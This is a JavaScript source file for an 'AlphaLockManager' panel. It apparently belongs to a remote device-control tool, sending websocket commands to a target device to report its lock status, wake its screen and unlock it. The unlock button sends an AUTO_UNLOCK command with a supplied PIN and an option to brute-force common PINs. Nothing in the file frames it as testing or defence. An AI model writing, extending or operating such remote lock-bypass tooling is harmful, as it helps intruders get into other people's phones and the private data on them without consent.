'use strict';

class AlphaLockManager {

  constructor(containerEl, ws, devId) {
    this.el    = containerEl;
    this.ws    = ws;
    this.devId = devId;
    this._render();
    this._poll();
  }

  destroy() { clearInterval(this._pollTimer); }

  onLockStatus({ id, locked, secure, screenOn, lockType }) {
    if (id !== this.devId) return;
    const e = this.el;
    e.querySelector('#lkStatus').textContent  = locked ? '🔒 Locked' : '🔓 Unlocked';
    e.querySelector('#lkStatus').className    = 'lk-status ' + (locked ? 'locked' : 'unlocked');
    e.querySelector('#lkType').textContent    = lockType || '—';
    e.querySelector('#lkScreen').textContent  = screenOn ? 'On' : 'Off';
    e.querySelector('#lkSecure').textContent  = secure ? 'Yes' : 'No';
  }

  onUnlockResult({ id, cmd, success, msg }) {
    if (id !== this.devId || cmd !== 'AUTO_UNLOCK') return;
    this._toast(success ? '✓ Unlocked' : `✗ ${msg || 'failed'}`);
  }

  _render() {
    this.el.innerHTML = `
      <div class="lk-panel">
        <div class="lk-row">
          <span id="lkStatus" class="lk-status">—</span>
          <button class="btn-primary" id="lkRefresh">↻</button>
        </div>
        <div class="lk-info">
          <div class="lk-field"><label>Type</label><span id="lkType">—</span></div>
          <div class="lk-field"><label>Screen</label><span id="lkScreen">—</span></div>
          <div class="lk-field"><label>Secure</label><span id="lkSecure">—</span></div>
        </div>
        <div class="lk-actions">
          <button class="btn-primary lk-big" id="lkUnlock">🔓 Unlock</button>
          <button class="btn-sm" id="lkWake">Wake Screen</button>
        </div>
        <div class="lk-opts">
          <div class="lk-field">
            <label>PIN / Password</label>
            <input id="lkPin" type="text" placeholder="1234" maxlength="20" />
          </div>
          <label class="lk-toggle">
            <input type="checkbox" id="lkBrute" /> Brute-force common PINs
          </label>
        </div>
        <div class="lk-toast" id="lkToast"></div>
      </div>
    `;

    this.el.querySelector('#lkRefresh').onclick = () => this._getStatus();
    this.el.querySelector('#lkWake').onclick    = () =>
      this.ws.cmd(this.devId, 'WAKEUP', {});
    this.el.querySelector('#lkUnlock').onclick  = () => {
      const pin     = this.el.querySelector('#lkPin').value.trim() || null;
      const brute   = this.el.querySelector('#lkBrute').checked;
      this.ws.cmd(this.devId, 'AUTO_UNLOCK', { pin, bruteforce: brute });
      this._toast('Attempting unlock…');
    };
  }

  _getStatus() {
    this.ws.cmd(this.devId, 'GET_LOCK_STATUS', {});
  }

  _poll() {
    this._getStatus();
    this._pollTimer = setInterval(() => this._getStatus(), 5000);
  }

  _toast(msg) {
    const t = this.el.querySelector('#lkToast');
    if (!t) return;
    t.textContent = msg;
    t.style.opacity = '1';
    clearTimeout(this._toastTimer);
    this._toastTimer = setTimeout(() => t.style.opacity = '0', 3000);
  }
}

window.AlphaLockManager = AlphaLockManager;
